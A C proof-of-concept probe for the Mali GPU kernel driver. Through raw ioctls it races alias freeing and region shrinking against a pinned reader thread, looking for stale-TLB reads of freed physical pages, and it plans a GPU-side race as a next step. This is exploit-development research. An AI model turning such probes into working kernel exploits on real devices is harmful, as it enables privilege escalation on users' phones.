/* mali_stale_page_test.c — Test for stale page access after alias/shrink
 *
 * KEY FINDING FROM SOURCE AUDIT:
 * Both MEM_FREE and MEM_COMMIT hold kbase_gpu_vm_lock for their ENTIRE
 * duration. The "91% race win" in mali_alias_race.c just means the FREE
 * thread acquires the mutex first — the alias is FULLY torn down before
 * the shrink runs. No stale GPU PTEs exist after a "win."
 *
 * This probe tests the ONE remaining angle: CPU TLB propagation delay.
 * Between zap_vma_ptes (clears CPU PTEs + TLB invalidation IPI) and the
 * IPI actually completing on other cores, a tight reader loop on another
 * core might still use a stale TLB entry to read freed physical pages.
 *
 * Test flow:
 *   1. Alloc native 16 pages (GROW_ON_GPF + CPU_RD + CPU_WR)
 *   2. CPU mmap the native region
 *   3. Write marker pattern (0xDEADBEEF) to pages 8-15
 *   4. Create alias → gpu_mappings = 2
 *   5. Start reader thread pinned to a different CPU, tight-looping on page 15
 *   6. Free alias (gpu_mappings → 1)
 *   7. Shrink to 8 (zaps CPU PTEs for pages 8-15, frees physical pages)
 *   8. Immediately alloc new 8-page region, write 0xCAFEBABE
 *   9. Reader reports: did it see 0xCAFEBABE through stale TLB?
 *
 * Also tests: does MEM_QUERY on the alias VA return anything after free?
 * (Should return error — confirms alias is truly gone after race "win")
 *
 * Safety: fork + alarm. No GPU access to freed pages.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <pthread.h>
#include <signal.h>
#include <sched.h>
#include <setjmp.h>

#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC    (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_COMMIT   (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY    (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE     (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS    (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS    (UK_FUNC_ID + 18)

#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_GROW_ON_GPF    (1U << 9)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t sizeOfUkHeader;
} uk_header;

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t _pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t  _pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

/* mmap2 wrapper for 64-bit GPU VAs on 32-bit ARM */
static void *mali_cpu_mmap(int fd, size_t size, uint64_t gpu_va, int prot) {
    unsigned long pgoff = (unsigned long)(gpu_va >> 12);
    printf("[dbg] mali_cpu_mmap: size=%zu gpu_va=0x%llx pgoff=0x%lx\n",
           size, (unsigned long long)gpu_va, pgoff);
    void *p = (void *)syscall(__NR_mmap2, (unsigned long)NULL, size,
                              prot, MAP_SHARED, fd, pgoff);
    if (p == MAP_FAILED)
        printf("[dbg] mmap2 failed: errno=%d (%s)\n", errno, strerror(errno));
    return p;
}

static int mali_fd;

static int mali_init(int fd) {
    uint8_t buf[64];
    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 0;
    *(uint16_t*)(buf + 8) = 10;
    *(uint16_t*)(buf + 10) = 2;
    if (ioctl(fd, _IOC(3, 0x80, 0, 16), buf) < 0) return -1;
    memset(buf, 0, sizeof(buf));
    *(uint32_t*)buf = 530;
    *(uint32_t*)(buf + 8) = 0;
    if (ioctl(fd, _IOC(3, 0x80, 0, 16), buf) < 0) return -1;

    /* Map the Memory Tracking Page — required before any other mmap */
    /* BASE_MEM_MAP_TRACKING_HANDLE = 2 << 12 = 0x2000, pgoff = 2 */
    void *mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL,
                                (size_t)4096, PROT_NONE, MAP_SHARED, fd,
                                (unsigned long)2);
    if (mtp == MAP_FAILED) {
        printf("[dbg] MTP mmap failed: %d (%s), trying pgoff=3\n",
               errno, strerror(errno));
        /* Try alternate handle value */
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL,
                              (size_t)4096, PROT_NONE, MAP_SHARED, fd,
                              (unsigned long)3);
        if (mtp == MAP_FAILED) {
            printf("[dbg] MTP mmap (pgoff=3) also failed: %d\n", errno);
            return -1;
        }
    }
    printf("[+] MTP mapped at %p\n", mtp);
    return 0;
}

static uint64_t mali_alloc(int fd, uint64_t pages, uint32_t flags) {
    struct kbase_uk_mem_alloc a;
    memset(&a, 0, sizeof(a));
    a.header.id = KBASE_FUNC_MEM_ALLOC;
    a.va_pages = pages;
    a.commit_pages = pages;
    a.extent = pages;
    a.flags = flags;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(a)), &a) < 0) return 0;
    if (a.header.ret != 0) return 0;
    return a.gpu_va;
}

static int mali_free(int fd, uint64_t va) {
    struct kbase_uk_mem_free mf;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = va;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(mf)), &mf);
    return mf.header.ret;
}

static int mali_commit(int fd, uint64_t va, uint64_t pages) {
    struct kbase_uk_mem_commit c;
    memset(&c, 0, sizeof(c));
    c.header.id = KBASE_FUNC_MEM_COMMIT;
    c.gpu_addr = va;
    c.pages = pages;
    ioctl(fd, _IOC(3, 0x80, 0, sizeof(c)), &c);
    return c.header.ret;
}

static uint64_t mali_alias(int fd, uint64_t src, uint64_t off, uint64_t len) {
    struct base_mem_aliasing_info ai;
    memset(&ai, 0, sizeof(ai));
    ai.handle = src;
    ai.offset = off;
    ai.length = len;
    struct kbase_uk_mem_alias alias;
    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = len;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&ai;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(alias)), &alias) < 0) return 0;
    if (alias.header.ret != 0) return 0;
    return alias.gpu_va;
}

static int mali_query_commit(int fd, uint64_t va) {
    struct kbase_uk_mem_query q;
    memset(&q, 0, sizeof(q));
    q.header.id = KBASE_FUNC_MEM_QUERY;
    q.gpu_addr = va;
    q.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    if (ioctl(fd, _IOC(3, 0x80, 0, sizeof(q)), &q) < 0) return -1;
    if (q.header.ret != 0) return -1;
    return (int)q.value;
}

/* Reader thread state */
static volatile int g_reader_go;
static volatile int g_reader_stop;
static volatile uint32_t g_last_read;
static volatile int g_fault_count;
static volatile uint32_t *g_reader_addr;
static volatile int g_stale_reads;
static __thread sigjmp_buf g_jmpbuf;
static __thread int g_jmp_set;

static void fault_handler(int sig) {
    (void)sig;
    g_fault_count++;
    g_reader_stop = 1;
    if (g_jmp_set)
        siglongjmp(g_jmpbuf, 1);
}

static void *reader_thread(void *arg) {
    (void)arg;

    /* Try to pin to CPU 1 (main on CPU 0) */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* Install fault handlers */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sa.sa_flags = 0; /* no SA_RESTART so siglongjmp works */
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    /* Spin until told to start */
    while (!g_reader_go) { }

    /* Tight read loop — try to catch stale TLB entry */
    uint32_t val = 0;
    int reads = 0;

    g_jmp_set = 1;
    if (sigsetjmp(g_jmpbuf, 1) != 0) {
        /* Landed here from fault handler */
        printf("[*] Reader: faulted after %d reads, last=0x%08x\n", reads, g_last_read);
        goto reader_done;
    }

    while (!g_reader_stop && reads < 10000000) {
        val = *g_reader_addr;
        reads++;
        g_last_read = val;
        if (val == 0xCAFEBABE) {
            g_stale_reads++;
            if (g_stale_reads == 1)
                printf("[!!!] STALE READ: got 0x%08x from freed page!\n", val);
        }
    }

reader_done:
    g_jmp_set = 0;
    printf("[*] Reader: %d reads, last=0x%08x, stale=%d, faults=%d\n",
           reads, (unsigned)g_last_read, g_stale_reads, g_fault_count);
    return NULL;
}

static void do_test(void) {
    mali_fd = open("/dev/mali0", O_RDWR);
    if (mali_fd < 0) {
        printf("[-] open mali0: %s\n", strerror(errno));
        return;
    }
    if (mali_init(mali_fd) < 0) {
        printf("[-] mali_init failed\n");
        close(mali_fd);
        return;
    }
    printf("[+] Mali initialized\n");

    /* Pin main thread to CPU 0 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    printf("\n=== Phase 1: Serialization proof ===\n");
    printf("Testing that alias FREE + native SHRINK are serialized by mutex\n\n");

    /* Alloc native with CPU flags */
    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                     BASE_MEM_GROW_ON_GPF;
    uint64_t native_va = mali_alloc(mali_fd, 16, flags);
    if (!native_va) {
        printf("[-] alloc failed\n");
        close(mali_fd);
        return;
    }
    printf("[+] Native alloc: gpu_va=0x%llx\n", (unsigned long long)native_va);

    /* CPU mmap the native region (use mmap2 for 64-bit gpu_va) */
    void *cpu_map = mali_cpu_mmap(mali_fd, 16 * 4096, native_va,
                                  PROT_READ | PROT_WRITE);
    if (cpu_map == MAP_FAILED) {
        printf("[-] mmap failed: %s\n", strerror(errno));
        mali_free(mali_fd, native_va);
        close(mali_fd);
        return;
    }
    printf("[+] CPU mmap: %p\n", cpu_map);

    /* Write marker pattern to pages 8-15 */
    volatile uint32_t *page8 = (volatile uint32_t *)((char *)cpu_map + 8 * 4096);
    for (int i = 0; i < 8; i++) {
        volatile uint32_t *pg = (volatile uint32_t *)((char *)cpu_map + (8 + i) * 4096);
        pg[0] = 0xDEADBEEF;
        pg[1] = 0xDEADBEEF;
    }
    printf("[+] Wrote 0xDEADBEEF to pages 8-15, readback page 8: 0x%08x\n",
           page8[0]);

    /* Create alias (increments gpu_mappings to 2) */
    uint64_t alias_va = mali_alias(mali_fd, native_va, 8, 8);
    if (!alias_va) {
        printf("[-] alias failed\n");
        munmap(cpu_map, 16 * 4096);
        mali_free(mali_fd, native_va);
        close(mali_fd);
        return;
    }
    printf("[+] Alias created: gpu_va=0x%llx\n", (unsigned long long)alias_va);

    /* Test 1: Verify shrink blocked while alias exists */
    int ret = mali_commit(mali_fd, native_va, 8);
    printf("[*] Shrink with alias: ret=%d (expect non-zero)\n", ret);

    /* Free alias (gpu_mappings → 1) */
    mali_free(mali_fd, alias_va);
    printf("[+] Alias freed\n");

    /* Test 2: Query alias — should fail (region gone) */
    int alias_commit = mali_query_commit(mali_fd, alias_va);
    printf("[*] Query freed alias: ret=%d (expect -1 = gone)\n", alias_commit);

    printf("\n=== Phase 2: CPU TLB race test ===\n");
    printf("Reader on CPU 1, shrink on CPU 0, testing for stale TLB reads\n\n");

    /* Re-create alias for the TLB test */
    alias_va = mali_alias(mali_fd, native_va, 8, 8);
    if (!alias_va) {
        printf("[-] alias re-create failed\n");
        goto cleanup_phase2;
    }
    printf("[+] Alias re-created: gpu_va=0x%llx\n", (unsigned long long)alias_va);

    /* Point reader at last word of page 15 */
    g_reader_addr = (volatile uint32_t *)((char *)cpu_map + 15 * 4096);
    g_reader_go = 0;
    g_reader_stop = 0;
    g_stale_reads = 0;
    g_fault_count = 0;
    g_last_read = 0;

    pthread_t reader_tid;
    pthread_create(&reader_tid, NULL, reader_thread, NULL);

    /* Start reader */
    g_reader_go = 1;

    /* Small delay to ensure reader is looping */
    usleep(100);

    /* Free alias to lower gpu_mappings */
    mali_free(mali_fd, alias_va);
    alias_va = 0;

    /* SHRINK — this zaps CPU PTEs for pages 8-15 then frees them */
    ret = mali_commit(mali_fd, native_va, 8);
    printf("[*] Shrink after alias free: ret=%d\n", ret);

    if (ret == 0) {
        /* Pages 8-15 freed. Try to reclaim with new alloc */
        uint64_t reclaim_va = mali_alloc(mali_fd, 8, flags);
        if (reclaim_va) {
            void *reclaim_map = mali_cpu_mmap(mali_fd, 8 * 4096, reclaim_va,
                                              PROT_READ | PROT_WRITE);
            if (reclaim_map != MAP_FAILED) {
                /* Write canary to reclaimed pages */
                for (int i = 0; i < 8; i++) {
                    volatile uint32_t *pg = (volatile uint32_t *)((char *)reclaim_map + i * 4096);
                    pg[0] = 0xCAFEBABE;
                }
                printf("[+] Wrote 0xCAFEBABE to reclaim region\n");
                usleep(100); /* Let reader try to see it */
                munmap(reclaim_map, 8 * 4096);
            }
            mali_free(mali_fd, reclaim_va);
        }
    }

    /* Stop reader */
    g_reader_stop = 1;
    usleep(1000);
    pthread_join(reader_tid, NULL);

    printf("\n=== Results ===\n");
    printf("  Stale reads (0xCAFEBABE from freed page): %d\n", g_stale_reads);
    printf("  Fault count (SIGSEGV/SIGBUS): %d\n", g_fault_count);
    printf("  Last read value: 0x%08x\n", (unsigned)g_last_read);

    if (g_stale_reads > 0) {
        printf("\n*** CPU TLB STALE READ CONFIRMED ***\n");
        printf("Reader saw data from reclaimed physical pages through stale TLB\n");
    } else if (g_fault_count > 0) {
        printf("\n[*] Reader faulted — TLB properly invalidated\n");
        printf("[*] CPU-side stale access NOT viable on this hardware\n");
        printf("[*] Next step: GPU job submission for GPU-side TLB race\n");
    } else {
        printf("\n[*] Reader stopped without fault — exited loop before zap\n");
    }

cleanup_phase2:
    if (cpu_map != MAP_FAILED)
        munmap(cpu_map, 16 * 4096);
    mali_free(mali_fd, native_va);
    close(mali_fd);
}

int main(void) {
    printf("=== Mali Stale Page Access Test ===\n");
    printf("Tests: (1) serialization proof, (2) CPU TLB race\n\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(15);
        do_test();
        _exit(0);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status))
            printf("\nChild exited: %d\n", WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            printf("\nChild killed by signal: %d\n", WTERMSIG(status));
    } else {
        perror("fork");
        return 1;
    }
    return 0;
}
